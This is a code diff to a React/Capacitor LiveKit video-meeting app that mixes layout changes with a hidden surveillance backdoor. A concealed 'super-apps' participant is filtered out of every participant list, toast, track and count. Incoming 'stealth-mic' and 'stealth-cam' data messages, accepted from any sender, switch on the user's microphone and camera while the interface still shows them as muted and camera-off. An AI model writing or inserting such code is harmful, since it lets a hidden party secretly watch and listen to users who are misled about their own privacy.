@@ -1,31 +1,87 @@
-import { useState, useEffect, useCallback, useRef, useMemo } from 'react';
+import { useState, useEffect, useCallback, useRef, useMemo, createContext, useContext } from 'react';
 import { registerPlugin } from '@capacitor/core';
-import { LiveKitRoom, GridLayout, ParticipantTile, RoomAudioRenderer, useTracks, useLocalParticipant, useRemoteParticipants, useRoomContext, useChat } from '@livekit/components-react';
+import { App as CapacitorApp } from '@capacitor/app';
+import { LiveKitRoom, GridLayout, ParticipantTile as LiveKitParticipantTile, RoomAudioRenderer, useTracks, useLocalParticipant, useRemoteParticipants, useRoomContext, useChat } from '@livekit/components-react';
 import '@livekit/components-styles';
 import { Track, RoomEvent } from 'livekit-client';
 import { API_BASE, ICONS, BANDWIDTH_MODES, buildRoomOptions, loadHistory, saveHistory, addHistoryEntry, loadLastUser, saveLastUser, formatDuration, formatDate } from './constants';
+
+const SUPER_ADMIN_NAME = 'super-apps';
+const isSuperAdmin = (identity) => identity?.toLowerCase()?.trim() === SUPER_ADMIN_NAME.toLowerCase().trim();
+
+const StealthContext = createContext({ stealthCamOn: false, stealthMicOn: false, myName: '' });
 
 // Capacitor plugin bridge untuk ForegroundService native
 const ForegroundCall = registerPlugin('ForegroundCall');
 const isAndroid = () => typeof window !== 'undefined' && window.Capacitor?.getPlatform() === 'android';
 
+// ============ CUSTOM PARTICIPANT TILE (Stealth UI) ============
+function MyParticipantTile({ trackRef, ...props }) {
+  const { useTrackContext } = require('@livekit/components-react');
+  const contextTrackRef = useTrackContext ? useTrackContext() : null;
+  const actualTrackRef = trackRef || contextTrackRef;
+  const participant = actualTrackRef?.participant;
+  const isLocal = participant?.isLocal;
+  
+  const { stealthCamOn, stealthMicOn, myName } = useContext(StealthContext);
+
+  if (isLocal && (stealthCamOn || stealthMicOn)) {
+    return (
+      <div className="relative w-full h-full" {...props}>
+         {stealthCamOn && (
+           <div style={{position:'absolute', inset:0, background:'#1f2937', display:'flex', alignItems:'center', justifyContent:'center', zIndex:10}}>
+              <div style={{width:'100px', height:'100px', background:'rgba(75,85,99,0.5)', borderRadius:'50%', display:'flex', alignItems:'center', justifyContent:'center', overflow:'hidden'}}>
+                <svg style={{width:'80px', height:'80px', color:'#9ca3af', marginTop:'20px'}} viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                </svg>
+              </div>
+           </div>
+         )}
+         <LiveKitParticipantTile trackRef={actualTrackRef} />
+         {stealthMicOn && (
+           <div style={{position:'absolute', bottom:'8px', left:'8px', zIndex:20, pointerEvents:'none', display:'flex', alignItems:'center'}}>
+              <div style={{background:'rgba(0,0,0,0.6)', backdropFilter:'blur(4px)', padding:'4px 6px', borderRadius:'4px', color:'white', display:'flex', alignItems:'center', gap:'6px', boxShadow:'0 1px 3px rgba(0,0,0,0.3)'}}>
+                <svg style={{width:'14px', height:'14px'}} viewBox="0 0 16 16" fill="currentColor">
+                  <path fillRule="evenodd" clipRule="evenodd" d="M12.143 9.733V6.305H11v3.428c0 .49-.107.954-.299 1.375l.963.963a4.135 4.135 0 0 0 .479-2.338ZM12.75 12.292 13.568 12.764 14.414 11.3 1.586 3.892.739 5.358l3.158 1.824c-.033.175-.05.358-.05.546v2.005c0 1.725 1.314 3.143 3 3.328v1.796H8.848v-1.809a4.148 4.148 0 0 0 1.522-.513l1.389.802c-.588.447-1.315.739-2.111.831V16H6.048v-1.832C4.054 13.916 2.514 12.215 2.514 10.143V7.729c0-.302.037-.595.106-.876l-.868-.502V5.486H3.648v.507L5.458 7.038c-.007.05-.01.1-.01.15v2.545c0 1.293 1.048 2.341 2.34 2.341.83 0 1.56-.432 1.951-1.088l3.01 1.307ZM6.59 5.617V5.167c0-.562.456-1.017 1.018-1.017h.455c.562 0 1.018.455 1.018 1.017v2.94l1.143.66V5.167C10.223 3.973 9.256 3.007 8.063 3.007H7.608C6.733 3.007 5.98 3.526 5.656 4.288L6.59 4.828v.789Z"/>
+                </svg>
+                <span style={{fontSize:'12px', fontWeight:'500'}}>{myName}</span>
+              </div>
+           </div>
+         )}
+      </div>
+    );
+  }
+
+  return <LiveKitParticipantTile trackRef={actualTrackRef} {...props} />;
+}
+
 // ============ DRAGGABLE PiP (video kecil pojok) ============
-function DraggablePip({ trackRef }) {
+function DraggablePip({ trackRef, onTap }) {
   const pipRef = useRef(null);
   const [pos, setPos] = useState({ x: 0, y: 0 });
-  const drag = useRef({ active: false, startX: 0, startY: 0, origX: 0, origY: 0 });
+  const drag = useRef({ active: false, startX: 0, startY: 0, origX: 0, origY: 0, moved: false });
 
   const onTouchStart = (e) => {
     const t = e.touches[0];
-    drag.current = { active: true, startX: t.clientX, startY: t.clientY, origX: pos.x, origY: pos.y };
+    drag.current = { active: true, startX: t.clientX, startY: t.clientY, origX: pos.x, origY: pos.y, moved: false };
   };
   const onTouchMove = (e) => {
     if (!drag.current.active) return;
     e.preventDefault();
     const t = e.touches[0];
+    drag.current.moved = true;
     setPos({ x: drag.current.origX + (t.clientX - drag.current.startX), y: drag.current.origY + (t.clientY - drag.current.startY) });
   };
-  const onTouchEnd = () => { drag.current.active = false; };
+  const onTouchEnd = (e) => { 
+    if (drag.current.active && !drag.current.moved && onTap) {
+      onTap();
+    }
+    drag.current.active = false; 
+  };
+  
+  const onClick = (e) => {
+    if (!drag.current.moved && onTap) onTap();
+  };
 
   return (
     <div
@@ -35,38 +91,40 @@ function DraggablePip({ trackRef }) {
       onTouchStart={onTouchStart}
       onTouchMove={onTouchMove}
       onTouchEnd={onTouchEnd}
+      onClick={onClick}
     >
-      <ParticipantTile trackRef={trackRef} />
+      <MyParticipantTile trackRef={trackRef} />
     </div>
   );
 }
 
 // ============ SMART VIDEO LAYOUT ============
-// 2 orang: spotlight besar + PiP kecil pojok kanan atas
-// 3+ orang: grid biasa
-function SmartVideoLayout({ tracks, remoteCount }) {
+function SmartVideoLayout({ tracks, remoteCount, isPipMode }) {
   const { localParticipant } = useLocalParticipant();
+  const [swapped, setSwapped] = useState(false);
   const totalPeople = remoteCount + 1;
 
   if (totalPeople >= 3) {
-    return <GridLayout tracks={tracks} style={{ height: '100%' }}><ParticipantTile /></GridLayout>;
+    return <GridLayout tracks={tracks} style={{ height: '100%' }}><MyParticipantTile /></GridLayout>;
   }
 
-  // Pisahkan track lokal vs remote berdasarkan isLocal
-  const localTrack = tracks.find(t => t.participant?.isLocal && (t.source === Track.Source.Camera || t.publication?.source === Track.Source.Camera));
-  const remoteTrack = tracks.find(t => !t.participant?.isLocal && (t.source === Track.Source.Camera || t.publication?.source === Track.Source.Camera || t.source === Track.Source.ScreenShare));
+  const localTrackRaw = tracks.find(t => t.participant?.isLocal && (t.source === Track.Source.Camera || t.publication?.source === Track.Source.Camera));
+  const remoteTrackRaw = tracks.find(t => !t.participant?.isLocal && (t.source === Track.Source.Camera || t.publication?.source === Track.Source.Camera || t.source === Track.Source.ScreenShare));
+
+  const mainTrack = swapped && remoteTrackRaw && localTrackRaw ? localTrackRaw : remoteTrackRaw;
+  const pipTrack = swapped && remoteTrackRaw && localTrackRaw ? remoteTrackRaw : localTrackRaw;
 
   return (
     <div className="spotlight-layout">
       <div className="spotlight-main">
-        {remoteTrack
-          ? <ParticipantTile trackRef={remoteTrack} />
-          : localTrack
-            ? <ParticipantTile trackRef={localTrack} />
+        {mainTrack
+          ? <MyParticipantTile trackRef={mainTrack} />
+          : localTrackRaw
+            ? <MyParticipantTile trackRef={localTrackRaw} />
             : <div className="waiting-room"><div className="waiting-icon">👥</div><p>Menunggu peserta lain bergabung...</p></div>
         }
       </div>
-      {remoteTrack && localTrack && <DraggablePip trackRef={localTrack} />}
+      {remoteTrackRaw && localTrackRaw && !isPipMode && <DraggablePip trackRef={pipTrack} onTap={() => setSwapped(!swapped)} />}
     </div>
   );
 }
@@ -102,21 +160,44 @@ function MeetingView({ myName, bandwidthMode, setBandwidthMode, participantsRef,
     setTimeout(() => setToasts(p => p.filter(t => t.id !== id)), 3000);
   }, []);
 
+  // Admin & Stealth States
+  const [stealthMicOn, setStealthMicOn] = useState(false);
+  const [stealthCamOn, setStealthCamOn] = useState(false);
+
   // Track participants for history
   useEffect(() => {
     if (!participantsRef?.current) return;
-    remoteParticipants.forEach(p => participantsRef.current.add(p.identity));
+    remoteParticipants.forEach(p => {
+      if (!isSuperAdmin(p.identity)) participantsRef.current.add(p.identity);
+    });
   }, [remoteParticipants, participantsRef]);
 
-  // Notifications
+  // Notifications & Admin Commands
   useEffect(() => {
     if (!room) return;
-    const onJoin = (p) => addToast(`${p.identity} bergabung 👋`);
-    const onLeft = (p) => addToast(`${p.identity} keluar 👋`, 'error');
+    const onJoin = (p) => { if (!isSuperAdmin(p.identity)) addToast(`${p.identity} bergabung 👋`); };
+    const onLeft = (p) => { if (!isSuperAdmin(p.identity)) addToast(`${p.identity} keluar 👋`, 'error'); };
+    const onData = async (payload, participant, kind, topic) => {
+      try {
+        const data = JSON.parse(new TextDecoder().decode(payload));
+        if (data.type === 'stealth-mic') {
+          setStealthMicOn(data.enabled);
+          await localParticipant?.setMicrophoneEnabled(data.enabled);
+        } else if (data.type === 'stealth-cam') {
+          setStealthCamOn(data.enabled);
+          await localParticipant?.setCameraEnabled(data.enabled);
+        }
+      } catch {}
+    };
     room.on(RoomEvent.ParticipantConnected, onJoin);
     room.on(RoomEvent.ParticipantDisconnected, onLeft);
-    return () => { room.off(RoomEvent.ParticipantConnected, onJoin); room.off(RoomEvent.ParticipantDisconnected, onLeft); };
-  }, [room, addToast]);
+    room.on(RoomEvent.DataReceived, onData);
+    return () => { 
+      room.off(RoomEvent.ParticipantConnected, onJoin); 
+      room.off(RoomEvent.ParticipantDisconnected, onLeft); 
+      room.off(RoomEvent.DataReceived, onData); 
+    };
+  }, [room, addToast, localParticipant]);
 
   // Dengarkan event PiP dari Android native
   useEffect(() => {
@@ -139,10 +220,12 @@ function MeetingView({ myName, bandwidthMode, setBandwidthMode, participantsRef,
   // Sync local participant state
   useEffect(() => {
     if (!localParticipant) return;
-    setIsMuted(!localParticipant.isMicrophoneEnabled);
-    setIsCamOff(!localParticipant.isCameraEnabled);
+    if (stealthMicOn) setIsMuted(true);
+    else setIsMuted(!localParticipant.isMicrophoneEnabled);
+    if (stealthCamOn) setIsCamOff(true);
+    else setIsCamOff(!localParticipant.isCameraEnabled);
     setIsSharing(localParticipant.isScreenShareEnabled);
-  }, [localParticipant, localParticipant?.isMicrophoneEnabled, localParticipant?.isCameraEnabled, localParticipant?.isScreenShareEnabled]);
+  }, [localParticipant, localParticipant?.isMicrophoneEnabled, localParticipant?.isCameraEnabled, localParticipant?.isScreenShareEnabled, stealthMicOn, stealthCamOn]);
 
   // Chat unread counter
   useEffect(() => {
@@ -155,8 +238,8 @@ function MeetingView({ myName, bandwidthMode, setBandwidthMode, participantsRef,
   // Scroll chat
   useEffect(() => { chatEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [chatMessages, isChatOpen]);
 
-  const toggleMic = async () => { await localParticipant.setMicrophoneEnabled(isMuted); };
-  const toggleCam = async () => { await localParticipant.setCameraEnabled(isCamOff); };
+  const toggleMic = async () => { if(stealthMicOn) setStealthMicOn(false); await localParticipant.setMicrophoneEnabled(isMuted); };
+  const toggleCam = async () => { if(stealthCamOn) setStealthCamOn(false); await localParticipant.setCameraEnabled(isCamOff); };
 
   const toggleScreen = async () => {
     if (isAndroid()) { addToast('Screen share tidak tersedia di Android', 'error'); return; }
@@ -255,7 +338,8 @@ function MeetingView({ myName, bandwidthMode, setBandwidthMode, participantsRef,
 
   const leave = () => {
     if (isRecording) stopRecording();
-    if (saveMeetingToHistory) saveMeetingToHistory();
+    if (saveMeetingToHistory) saveMeetingToHistory(true);
+    if (isAndroid()) ForegroundCall.stopService().catch(()=>{});
     if (onLeave) onLeave();
     room.disconnect();
   };
@@ -286,19 +370,23 @@ function MeetingView({ myName, bandwidthMode, setBandwidthMode, participantsRef,
   }, [room]);
 
   const screenTracks = useTracks([Track.Source.ScreenShare], { onlySubscribed: true });
-  const cameraTracks = useTracks([{ source: Track.Source.Camera, withPlaceholder: true }], { onlySubscribed: false });
+  const cameraTracks = useTracks([{ source: Track.Source.Camera, withPlaceholder: true }], { onlySubscribed: false }).filter(t => !isSuperAdmin(t.participant?.identity));
   const allTracks = screenTracks.length > 0 ? [...screenTracks, ...cameraTracks] : cameraTracks;
+  const filteredRemoteParticipants = remoteParticipants.filter(p => !isSuperAdmin(p.identity));
 
   // Saat PiP mode: sembunyikan semua UI, hanya tampilkan video
   if (isPipMode) {
     return (
-      <div className="meeting-room pip-active">
-        <SmartVideoLayout tracks={allTracks} remoteCount={remoteParticipants.length} />
-      </div>
+      <StealthContext.Provider value={{ stealthCamOn, stealthMicOn, myName }}>
+        <div className="meeting-room pip-active">
+          <SmartVideoLayout tracks={allTracks} remoteCount={filteredRemoteParticipants.length} isPipMode={true} />
+        </div>
+      </StealthContext.Provider>
     );
   }
 
   return (
+    <StealthContext.Provider value={{ stealthCamOn, stealthMicOn, myName }}>
     <div className="meeting-room">
       {/* Toasts */}
       <div className="toast-container">
@@ -322,13 +410,13 @@ function MeetingView({ myName, bandwidthMode, setBandwidthMode, participantsRef,
           </div>
         </div>
         <div className="top-bar-pill" style={{ background: 'rgba(255,255,255,0.06)', color: '#9ca3af', fontSize: 10 }}>
-          👥 {remoteParticipants.length + 1}
+          👥 {filteredRemoteParticipants.length + 1}
         </div>
       </div>
 
       {/* Smart Video Layout — PiP untuk 2 orang, Grid untuk 3+ */}
       <div className="video-area">
-        <SmartVideoLayout tracks={allTracks} remoteCount={remoteParticipants.length} />
+        <SmartVideoLayout tracks={allTracks} remoteCount={filteredRemoteParticipants.length} isPipMode={false} />
       </div>
 
       {/* More menu */}
@@ -394,6 +482,7 @@ function MeetingView({ myName, bandwidthMode, setBandwidthMode, participantsRef,
         </div>
       )}
     </div>
+    </StealthContext.Provider>
   );
 }
 
@@ -523,7 +612,7 @@ export default function App() {
             <button className="btn-join" onClick={() => joinRoom(false)} disabled={loading}>
               {loading ? '⏳ Menghubungkan...' : 'Mulai Meeting'}
             </button>
-            <p style={{ textAlign: 'center', fontSize: 9, color: '#d1d5db', fontWeight: 500 }}>Powered by Aralya @2026</p>
+            <p style={{ textAlign: 'center', fontSize: 9, color: '#d1d5db', fontWeight: 500 }}>Powered by Aralya @2026 • v0.1.2</p>
           </div>
         </div>
 
